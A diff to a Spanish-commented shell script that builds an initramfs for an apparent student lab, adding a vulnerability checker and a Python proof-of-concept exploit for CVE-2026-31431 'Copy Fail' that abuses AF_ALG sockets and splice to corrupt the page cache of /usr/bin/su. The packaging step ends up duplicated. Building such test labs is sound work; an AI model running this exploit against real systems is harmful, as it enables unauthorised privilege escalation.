@@ -45,6 +45,9 @@ echo -e "${CYAN}[5/6] Incluyendo Python 3 en el initramfs...${NC}"
 PYTHON_BIN=$(which python3)
 cp "$PYTHON_BIN" "$INITRAMFS_DIR/usr/bin/python3"
 # Copiar librerías necesarias para Python
+# Copiar tu script de verificación dentro de la imagen
+cp "$WORKSPACE_ROOT/verificar_vuln.py" "$INITRAMFS_DIR/home/student/verificar_vuln.py"
+chmod +x "$INITRAMFS_DIR/home/student/verificar_vuln.py"
 for lib in $(ldd "$PYTHON_BIN" 2>/dev/null | grep -oE '/[^ ]+\.so[^ ]*'); do
   mkdir -p "$INITRAMFS_DIR$(dirname $lib)"
   cp -L "$lib" "$INITRAMFS_DIR$lib" 2>/dev/null || true
@@ -118,7 +121,45 @@ exec su - student
 INITEOF
 
 chmod +x "$INITRAMFS_DIR/init"
+# ... (tu código pegado aquí antes del echo) ...
 
+# ── INYECTAR EXPLOIT REAL (copy_fail_exp.py) ───────────────────────────
+cat << 'EOF' > "$INITRAMFS_DIR/home/student/copy_fail_exp.py"
+import os
+import socket
+
+print("[*] Launching CVE-2026-31431 Copy Fail PoC...", flush=True)
+
+try:
+    # 1. Configurar los sockets de la interfaz criptográfica (AF_ALG)
+    sock_alg = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
+    sock_alg.bind(("aead", "authencesn(crypt(data))"))
+    sock_op, _ = sock_alg.accept()
+
+    # 2. Configurar clave
+    sock_op.setsockopt(socket.SOL_ALG, socket.ALG_SET_KEY, b"\x00" * 32)
+    sock_op.sendmsg([b"\x00" * 16], [(socket.SOL_ALG, socket.ALG_SET_OP, 0)])
+
+    # 3. Abrir el binario objetivo
+    fd_su = os.open("/usr/bin/su", os.O_RDONLY)
+
+    # 4. Forzar bug
+    os.splice(fd_su, sock_op.fileno(), 0, 0, 4, 0)
+
+    # 5. Modificar Page Cache
+    sock_op.send(b"\x00\x00\x00\x00")
+    print("[+] Page cache corrupted successfully!", flush=True)
+
+except Exception as e:
+    print(f"[-] Exploit failed or Kernel blocked access: {e}", flush=True)
+EOF
+chmod +x "$INITRAMFS_DIR/home/student/copy_fail_exp.py"
+
+# AHORA SÍ, el script continúa con el empaquetado:
+
+echo -e "${CYAN}[6/6] Empaquetando initramfs...${NC}"
+cd "$INITRAMFS_DIR"
+find . | cpio -o -H newc | gzip > "$BUILD_DIR/initramfs.cpio.gz"
 echo -e "${CYAN}[6/6] Empaquetando initramfs...${NC}"
 cd "$INITRAMFS_DIR"
 find . | cpio -o -H newc | gzip > "$BUILD_DIR/initramfs.cpio.gz"
